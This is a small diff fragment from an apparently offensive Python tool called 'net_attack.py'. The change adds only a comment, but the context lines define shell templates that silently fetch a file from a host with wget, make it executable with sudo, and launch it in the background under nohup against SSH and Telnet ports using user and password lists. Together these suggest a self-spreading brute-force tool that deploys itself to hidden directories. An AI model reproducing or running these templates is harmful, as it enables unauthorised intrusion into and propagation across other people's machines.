@@ -29,6 +29,7 @@ WGET_IF_NOT_PRESENT_INPUT = "[ ! -f %s ] && wget %s:%d/%s -q -o /dev/null\n"
 CHMOD_INPUT = "sudo -S chmod +x %s\n"
 START_SCRIPT_INPUT = "sudo nohup ./%s -u %s -p 22,23 -f %s -L -P >/dev/null 2>&1 &\n"
 
+# NAMES OF FILES & DIRECTORIES CREATED
 DEPLOYMENT_FILENAME = ".deploy"
 SCRIPT_FILENAME = "net_attack.py"
 DEPLOYMENT_DIRECTORY_NAME = "net_attack_deployment"
